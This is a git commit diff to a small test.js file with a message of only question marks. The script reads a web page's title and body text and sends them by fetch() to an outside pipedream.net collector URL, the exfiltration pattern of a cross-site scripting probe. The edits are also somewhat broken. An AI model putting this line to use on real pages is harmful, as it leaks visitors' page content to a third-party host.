3947812573bed01942064967c127dde4767bd930
QingkangYu <qingkang.yuu@gmail.com>
2023-03-13 14:10:39 -0400

    ?????

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 console.log(document.title);
 console.log(document.body.innerText);
-document.title.value = document.body.innerText;
+window.document.title = window.document.body;
 console.log(document.title.value);
-fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.value);
+fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + window.document.title);
